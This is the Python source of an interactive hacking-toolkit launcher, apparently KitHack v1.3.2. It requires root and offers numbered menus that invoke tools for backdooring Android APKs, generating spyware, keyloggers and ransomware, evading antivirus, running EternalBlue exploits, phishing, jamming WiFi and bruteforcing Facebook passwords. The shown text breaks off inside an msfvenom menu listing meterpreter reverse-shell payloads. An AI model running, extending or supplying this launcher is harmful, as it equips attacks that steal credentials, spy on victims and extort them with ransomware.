#!/usr/bin/python3
# -*- coding: utf-8 -*-
#Copyright 2021 KITHACK
#Written by: Adrian Guillermo
#Facebook: https://facebook.com/adrian.guillermo.22
#Github: https://github.com/AdrMXR

BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'

import sys
import os 
import subprocess
import time
import requests 
import webbrowser
from sys import exit 
from getch import pause  
from tkinter import Tk, filedialog
from lib.banners import *
from lib import kitools
from lib.network import run_network

def check_connection(host='https://www.google.com'):
	print("{}Checking your internet connection...".format(GREEN))
	time.sleep(0.5)
	try:
		req = requests.get(host, timeout=15)
		if req.status_code == 200:
			print("{}Internet connection successful.".format(GREEN))
			time.sleep(0.5)
			pass
	except:
		print("{0}[x]:{1} Check your internet connection.".format(RED, DEFAULT))
		exit(0)

def check_permissions():
	if os.getuid() == 0:
		info()
	else:
		os.system('clear')
		print("{0}[!]{1} ¡Permission denied! Remember to run: {2}sudo {1}python3 KitHack.py".format(RED, DEFAULT, GREEN))
		exit(0)

def info():
	os.system('clear')
	print("{0}[VERSION]:{1} 1.3.2\n\n".format(RED, DEFAULT))
	time.sleep(0.5)
	os.system('clear')

def main():
	print(start_main_menu)
	option = input("{0}KitHack >> {1}".format(RED, DEFAULT))
	option = option.zfill(2)
	
	if option == '01':
		os.system('clear')
		print ('========={0}Tool{1}==================================={0}Information{1}================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} Backdoor-apk        {2}Add a backdoor to any APK file.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Evil-Droid          {2}Android Backdoor Generator Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Spade               {2}APK Backdoor Tool Made in Python.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} AhMyth              {2}Android Remote Administration Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Andspoilt           {2}Run interactive Android exploits on Linux.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Kwetza              {2}Inject malware into existing Android apps.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Termux              {2}Linux based Android terminal emulator.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Android-Exploits    {2}Collection of Android exploits and hacks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Grabcam             {2}Allows to hack the camera of our victims with a fake page.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Androidpatternlock  {2}Allows to get the pattern lock on Android devices.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.BackdoorApk()
		
		elif tool == '02':
			kitools.EvilDroid()
		
		elif tool == '03':
			kitools.Spade()
		
		elif tool == '04':
			kitools.AhMyth()

		elif tool == '05':
			kitools.Andspoilt()

		elif tool == '06':
			kitools.Kwetza()

		elif tool == '07':
			kitools.Termux()

		elif tool == '08':
			kitools.AndroidExploits()

		elif tool == '09':
			kitools.Grabcam()

		elif tool == '10':
			kitools.AndroidPatternLock()
		
		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '02':
		os.system('clear')
		print ('========{0}Tool{1}================================================{0}Information{1}==================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} Winpayloads             {2}Undetectable payload generator in Windows.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} sAINT                   {2}Spyware generator for Windows systems.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} BeeLogger               {2}Gmail Keylogger Generator for Windows.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} FakeImageExploiter      {2}Inject malware into jpg images for Windows.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Koadic                  {2}Post-Exploit Windows Rootkit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Phantom Evasion         {2}Antivirus Evasion Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Ps1encode               {2}PowerShell-based payload generator and encoder.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} DKMC                    {2}Malicious Payload Evasion Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Cromos                  {2}Inject code into legitimate Chrome Web extensions.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Eternal_scanner         {2}Scanner for Eternal Blue and Eternal Romance exploit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} EternalblueDoublepulsar {2}Metasploit module to exploit the Eternalblue-Doublepulsar vulnerability.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}12){1} EternalBlueWinXPWin10   {2}Metasploit Module for EternalBlue from Windows XP SP2 to Windows 10 Pro.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Windows-Exploits        {2}Windows Exploits Collection.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.Winpayloads()

		elif tool == '02':
			kitools.sAINT()

		elif tool == '03':
			kitools.BeeLogger()

		elif tool == '04':
			kitools.FakeImageExploiter()

		elif tool == '05':
			kitools.Koadic()

		elif tool == '06':
			kitools.PhantomEvasion()

		elif tool == '07':
			kitools.Ps1encode()

		elif tool == '08':
			kitools.DKMC()

		elif tool == '09':
			kitools.Cromos()

		elif tool == '10':
			kitools.EternalScanner()
		
		elif tool == '11':
			kitools.EternalblueDoublepulsarMetasploit()

		elif tool == '12':
			kitools.MS17010EternalBlueWinXPWin10()

		elif tool == '13':
			kitools.WindowsExploits()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()			

	elif option == '03':
		os.system('clear')
		print ('======={0}Tool{1}======================================={0}Information{1}====================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} HiddenEye    {2}Modern phishing tool with advanced functionality.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} PhishX       {2}Phishing and Spoofing Generator.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} SocialPhish  {2}Phishing tool with 32 templates + 1 customizable.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} SocialFish   {2}Phishing educational tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} PhisherMan   {2}Phishing tool with 17 templates and working with ngrok.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Spectre      {2}Supports phishing attacks with almost any website.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Blackeye     {2}Phishing tool with 38 websites available.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} PhEmail      {2}Automate phishing email delivery processes.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Weeman       {2}HTTP Server for Phishing.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Zphisher     {2}Automated phishing tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} AIOPhish     {2}Phishing tool with different options.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.HiddenEye()

		elif tool == '02':
			kitools.PhishX()

		elif tool == '03':
			kitools.SocialPhish()

		elif tool == '04':
			kitools.SocialFish()

		elif tool == '05':
			kitools.PhisherMan()

		elif tool == '06':
			kitools.Spectre()

		elif tool == '07':
			kitools.Blackeye()

		elif tool == '08':
			kitools.PhEmail()

		elif tool == '09':
			kitools.Weeman()

		elif tool == '10':
			kitools.Zphisher()

		elif tool == '11':
			kitools.AIOPhish()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '04':
		os.system('clear')
		print ('======={0}Tool{1}====================================={0}Information{1}======================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} Fluxion        {2}Network Auditing/Social Engineering Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Wifiphisher    {2}WiFi Password Capture Tool Using AP.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Wifibroot      {2}WPA/WPA2 WiFi Penetration Testing Tool. '.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Wifite         {2}Run existing wireless auditing tools for you.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Ettercap       {2}Interceptor/sniffer/logger for switched LANs .'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} Linset         {2}WPA/WPA2 Phishing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} WiFi-Pumpkin   {2}AP framework to easily create fake networks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Wifresti       {2}Find your wireless network password on Windows, Linux and Mac OS.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Evil Limiter   {2}Device bandwidth limiting tool.'.format(WHITE, YELLOW, DEFAULT))					
		print ('{0}10){1} Netool-toolkit {2}MitM pentesting open source toolkit.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}11){1} Dracnmap       {2}Tool used to exploit networks and collect data with NMAP.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}12){1} Airgeddon      {2}Bash script to audit wireless networks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Routersploit   {2}Router Penetration Testing Modules.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}14){1} Eaphammer      {2}Kit to perform targeted attacks against WPA2-Enterprise networks.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}15){1} VMR-MDK        {2}Script to decrypt WPS wireless networks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} Wirespy        {2}Allows you to configure fast honeypots to carry out MITM.'.format(WHITE, YELLOW, DEFAULT))						
		print ('{0}17){1} Wireshark      {2}Network Capture/Analyzing Tool.'.format(WHITE, YELLOW, DEFAULT))						
		print ('{0}18){1} SniffAir       {2}Wireless Pentesting Framework.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}19){1} WifiJammer     {2}WiFi Client/Router Jammer.'.format(WHITE, YELLOW, DEFAULT))						
		print ('{0}20){1} KawaiiDeauther {2}WiFi DeAuth Attack Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2) 
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.Fluxion()

		elif tool == '02':
			kitools.Wifiphisher()

		elif tool == '03':
			kitools.Wifibroot()

		elif tool == '04':
			kitools.Wifite()

		elif tool == '05':
			kitools.Ettercap()

		elif tool == '06':
			kitools.Linset()

		elif tool == '07':
			kitools.WiFiPumpkin()

		elif tool == '08':
			kitools.Wifresti()

		elif tool == '09':
			kitools.EvilLimiter()

		elif tool == '10':
			kitools.NetoolToolkit()

		elif tool == '11':
			kitools.Dracnmap()

		elif tool == '12':
			kitools.Airgeddon()

		elif tool == '13':
			kitools.Routersploit()

		elif tool == '14':
			kitools.Eaphammer()

		elif tool == '15':
			kitools.VMRMDK()

		elif tool == '16':
			kitools.Wirespy()

		elif tool == '17':
			kitools.Wireshark()

		elif tool == '18':
			kitools.SniffAir()

		elif tool == '19':
			kitools.WifiJammer()

		elif tool == '20':
			kitools.KawaiiDeauther()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '05':
		os.system('clear')
		print ('======={0}Tool{1}====================================={0}Information{1}================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} Cupp            {2}Allows you to create dictionaries specifically for a person.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Facebooker      {2}Facebook Password Bruteforcer Made in Perl.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} BluForce-FB     {2}Facebook Password Bruteforcer.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Brut3k1t        {2}Bruteforce Attack Kit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} SocialBox       {2}Bruteforce Framework.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} John The Ripper {2}Password Bruteforcing Tool.'.format(WHITE, YELLOW, DEFAULT))		
		print ('{0}07){1} Hashcat         {2}Hash Cracking Toolkit.'.format(WHITE, YELLOW, DEFAULT))		
		print ('{0}08){1} Brutedum        {2}SSH/FTP/Telnet/PostgreSQL/RDP/VNC/Medusa Bruteforcer.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}09){1} Facebash        {2}Facebook Bruteforcer Made in Shellscript Using TOR.'.format(WHITE, YELLOW, DEFAULT))			
		print ('{0}10){1} Brutespray      {2}Port Scanner/Bruteforcer.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}11){1} Pupi            {2}Password Generator Using Personal Information.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}12){1} B4r-brute       {2}Facebook Account Cracker Using User ID.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Fb-Hack         {2}Facebook Password "Hack"/Recovery Script.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.Cupp()

		elif tool == '02':
			kitools.Facebooker()

		elif tool == '03':
			kitools.BluForceFB()

		elif tool == '04':
			kitools.Brut3k1t()

		elif tool == '05':
			kitools.SocialBox()

		elif tool == '06':
			kitools.JohnTheRipper()

		elif tool == '07':
			kitools.Hashcat()

		elif tool == '08':
			kitools.Brutedum()

		elif tool == '09':
			kitools.Facebash()

		elif tool == '10':
			kitools.Brutespray()

		elif tool == '11':
			kitools.Pupi()

		elif tool == '12':
			kitools.B4rbrute()

		elif tool == '13':
			kitools.FbHack()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()	

	elif option == '06':
		os.system('clear')
		print ('======={0}Tool{1}========================================={0}Information{1}========================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} SQLmap       {2}SQLi Penetration Testing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} XAttacker    {2}Website Vulnerability Scanner.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Fuxploider   {2}Detect favorable techniques to load web shells or any malicious files.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Wordpresscan {2}WordPress Vulnerability Scanner.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} SiteBroker   {2}Information Collecting/Website Penetration Testing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} NoSQLMap     {2}NoSQL Default Configuration Weakness Exploitation Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Sqli-scanner {2}SQL Injection Vulnerability Scanner.'.format(WHITE, YELLOW, DEFAULT))		
		print ('{0}08){1} Joomscan     {2}Website Misconfiguration Scanner.'.format(WHITE, YELLOW, DEFAULT))				
		print ('{0}09){1} Metagoofil   {2}Metadata Extraction Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} Sublist3r    {2}Subdomain Enumeration Tool.'.format(WHITE, YELLOW, DEFAULT))					
		print ('{0}11){1} WAFNinja     {2}Web Application Firewall Attacker.'.format(WHITE, YELLOW, DEFAULT))					
		print ('{0}12){1} Dirsearch    {2}Directory/File Path Bruteforcing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} XSStrike     {2}Advanced XSS Scanner.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}14){1} LinksF1nd3r  {2}Web Component Extractor.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}15){1} D-TECT       {2}Modern Website Penetration Testing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} Phpsploit    {2}Tool capable of maintaining access to a compromised web server.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.SQLmap()

		elif tool == '02':
			kitools.XAttacker()

		elif tool == '03':
			kitools.Fuxploider()

		elif tool == '04':
			kitools.Wordpresscan()

		elif tool == '05':
			kitools.SiteBroker()

		elif tool == '06':
			kitools.NoSQLMap()

		elif tool == '07':
			kitools.SqliScanner()

		elif tool == '08':
			kitools.Joomscan()

		elif tool == '09':
			kitools.Metagoofil()

		elif tool == '10':
			kitools.Sublist3r()

		elif tool == '11':
			kitools.WAFNinja()

		elif tool == '12':
			kitools.Dirsearch()

		elif tool == '13':
			kitools.XSStrike()

		elif tool == '14':
			kitools.LinksF1nd3r()

		elif tool == '15':
			kitools.DTECH()

		elif tool == '16':
			kitools.Phpsploit()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()		

	elif option == '07':
		os.system('clear')
		print ('======={0}Tool{1}====================================={0}Information{1}=================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} SpoofMAC      {2}MAC Address Spoofing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Ip_spoofing   {2}ARP/HTTP Spoofing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Arpspoof      {2}ARP Spoofing Attacl Tool Using Linux Kernel Sockets.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} DerpNSpoof    {2}Simple DNS Spoofing Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} DrSpoof       {2}ARP Spoofing Detection Tool For Local Networks.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} GODKILLER     {2}SMS Bomber/Sender.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)

		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.SpoofMAC()

		elif tool == '02':
			kitools.IpSpoofing()

		elif tool == '03':
			kitools.Arpspoof()

		elif tool == '04':
			kitools.DerpNSpoof()

		elif tool == '05':
			kitools.DrSpoof()

		elif tool == '06':
			kitools.GODKILLER()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()		

	elif option == '08':
		os.system('clear')
		print ('========={0}Tool{1}========================================{0}Information{1}========================================'.format(GREEN, DEFAULT))
		print ('{0}01){1} NMAP           {2}Network Scanning Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Th3inspector   {2}AIO Information Gathering Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} FBI            {2}Collection of sensitive information on Facebook accounts.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} Infoga         {2}Email Information Extraction Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Crips          {2}IP Address/Website/DNS Record Lookup Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} BillCipher     {2}Website/IP Address Information Lookup Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} RED_HAWK       {2}Tool to collect information, scan vulnerabilities and trace.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Recon-ng       {2}Information Gathering Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} theHarvester   {2}Collection of emails, names, subdomains, IP addresses and URLs.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} PhoneInfoga    {2}Phone Number Information Lookup Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} Gasmask        {2}AIO Information Gathering Tool #2.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}12){1} URLextractor   {2}Website Information Gathering/Reconnaissance Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} Devploit       {2}Website DNS/WhoIS/IP/GeoIP/Subnet/Port/Host Lookup Tool'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}14){1} ReconDog       {2}AIO Basic Information Gathering Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}15){1} Webkiller      {2}Information Collection Kit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} Quasar         {2}Information Collection Framework.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}17){1} Info-instagram {2}Instagram Information Extraction Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}18){1} UserScan       {2}Username Lookup/Identity Scanner Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}19){1} XCTR-Hacking   {2}AIO Information Gathering Tool #3.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}20){1} DeadTrap       {2}Phone Number OSINT Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()

		elif tool == '01':
			kitools.NMAP()

		elif tool == '02':
			kitools.Th3inspector()

		elif tool == '03':
			kitools.FBI()

		elif tool == '04':
			kitools.Infoga()

		elif tool == '05':
			kitools.Crips()

		elif tool == '06':
			kitools.BillCipher()

		elif tool == '07':
			kitools.RedHawk()

		elif tool == '08':
			kitools.ReconNg()
		
		elif tool == '09':
			kitools.theHarvester()

		elif tool == '10':
			kitools.PhoneInfoga()

		elif tool == '11':
			kitools.Gasmask()		

		elif tool == '12':
			kitools.URLextractor()

		elif tool == '13':
			kitools.Devploit()

		elif tool == '14':
			kitools.ReconDog()

		elif tool == '15':
			kitools.Webkiller()

		elif tool == '16':
			kitools.Quasar()

		elif tool == '17':
			kitools.InfoInstagramIphone()

		elif tool == '18':
			kitools.UserScan()

		elif tool == '19':
			kitools.XCTRHackingTools()

		elif tool == '20':
			kitools.DeadTrap()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()			

	elif option == '09':
		os.system('clear')
		print ('======{0}Tool{1}===================================================={0}Information{1}======================================='.format(GREEN, DEFAULT))
		print ('{0}01){1} TheFatRat               {2}Malware Compiling Tool For Linux/Windows/MacOS & Android.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}02){1} Msfpc                   {2}Payload Generation Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}03){1} Fcrackzip               {2}Archive Password Cracking Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}04){1} QRLjacker               {2}QR Code Session Hijacking Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}05){1} Lazy                    {2}Script that automates many penetration processes.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}06){1} HTBINVITE               {2}HTB Invite Generator.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}07){1} Ngrok                   {2}Local Reverse Proxy.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}08){1} Bluepot                 {2}Bluetooth Honeypot Written in Java.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}09){1} Setoolkit               {2}Open Source Social Engineering Toolkit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}10){1} A2sv                    {2}SSL Vulnerability Scanner.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}11){1} 4nonimizer              {2}IP Anonymizer Using VPN Services.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}12){1} Easysploit              {2}Metasploit Automation Toolkit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}13){1} NXcrypt                 {2}Malware Injection Toolkit For Python Files.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}14){1} KnockMail               {2}Email Validity Checker'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}15){1} RkHunter                {2}UNIX Rootkit/Backdoor/Local Exploit Detection Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}16){1} HeraKeylogger           {2}Chrome Keylogger Extension.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}17){1} ZLogger                 {2}Persistent Remote Keylogger for Windows and Linux.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}18){1} Xerosploit              {2}Penetration Testing Toolkit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}19){1} Slacksec                {2}Basic Hacking Toolkit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}20){1} Katana-Framework        {2}Penetration Testing Framework.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}21){1} Z0172CK-Tools           {2}Z0172CK Hacking Toolkit.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}22){1} Cam-Hack                {2}Advanced Mobile/PC Camera Hacking Tool Using a Link.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}23){1} Onex                    {2}Hacking Tool Library.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}24){1} Ransom0                 {2}Ransomware Creation Tool.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}25){1} Morpheus                {2}TCP/UDP Man-in-the-Middle Attack Suite.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}26){1} FBTOOL                  {2}Facebook Hacking Toolkit'.format(WHITE, YELLOW, DEFAULT))
		print ('{0}27){1} Venom                   {2}Metasploit Shellcode Generator/Compiler/Driver.'.format(WHITE, YELLOW, DEFAULT))
		print ('{0} 0){1} Back'.format(WHITE, YELLOW))

		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		tool = tool.zfill(2)
		
		if tool == '00':
			os.system('clear')
			main()
	
		elif tool == '01':
			kitools.TheFatRat()

		elif tool == '02':
			kitools.Msfpc()

		elif tool == '03':
			kitools.Fcrackzip()

		elif tool == '04':
			kitools.QRLjacker()

		elif tool == '05':
			kitools.Lazy()

		elif tool == '06':
			kitools.HTBINVITE()

		elif tool == '07':
			kitools.Ngrok()

		elif tool == '08':
			kitools.Bluepot()

		elif tool == '09':
			kitools.Setoolkit()

		elif tool == '10':
			kitools.A2sv()

		elif tool == '11':
			kitools.Fornonimizer()

		elif tool == '12':
			kitools.Easysploit()

		elif tool == '13':
			kitools.NXcrypt()

		elif tool == '14':
			kitools.KnockMail()

		elif tool == '15':
			kitools.RkHunter()

		elif tool == '16':
			kitools.HeraKeylogger()

		elif tool == '17':
			kitools.ZLogger()

		elif tool == '18':
			kitools.Xerosploit()

		elif tool == '19':
			kitools.Slacksec()

		elif tool == '20':
			kitools.Katana()

		elif tool == '21':
			kitools.Z0172CKTools()

		elif tool == '22':
			kitools.CamHack()

		elif tool == '23':
			kitools.Onex()

		elif tool == '24':
			kitools.Ransom0()

		elif tool == '25':
			kitools.Morpheus()

		elif tool == '26':
			kitools.FBTOOL()

		elif tool == '27':
			kitools.Venom()

		else:
			print("\n{}[X] INVALID OPTION".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()		

	elif option == '10':
		# sys msfvenom
		os.system('clear')
		print(msf_banner)
		print ('\n{0} [*] {1}Sys Payloads:\n'.format(DEFAULT, GREEN))
		print ('{0}[01] {1}LINUX {0}--> {2}Kithack.elf'.format(WHITE, YELLOW, RED))
		print ('{0}[02] {1}WINDOWS {0}--> {2}Kithack.exe'.format(WHITE, YELLOW, RED))
		print ('{0}[03] {1}ANDROID {0}--> {2}Kithack.apk'.format(WHITE, YELLOW, RED))
		print ('{0}[04] {1}MAC OS {0}--> {2}Kithack.macho'.format(WHITE, YELLOW, RED))
		print ('{0}[05] {1}PHP {0}--> {2}Kithack.php'.format(WHITE, YELLOW, RED))
		print ('{0}[06] {1}PYTHON {0}--> {2}Kithack.py'.format(WHITE, YELLOW, RED))
		print ('{0}[07] {1}BASH {0}--> {2}Kithack.sh'.format(WHITE, YELLOW, RED))
		print ('{0}[08] {1}PERL {0}--> {2}Kithack.pl'.format(WHITE, YELLOW, RED))
		print ('{0}[09] {1}RUN MSFCONSOLE {0}'.format(WHITE, YELLOW))
		print ('{0} [0] {1}Back'.format(WHITE, YELLOW))

		sys = input("{0}KitHack >> {1}".format(RED, DEFAULT))
		sys = sys.zfill(2)

		if sys == '00':
			os.system('clear')
			main()

		elif sys == '01':
			print ('{0}\n[*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} linux/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} linux/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} linux/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} linux/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} linux/x64/shell_bind_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} linux/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
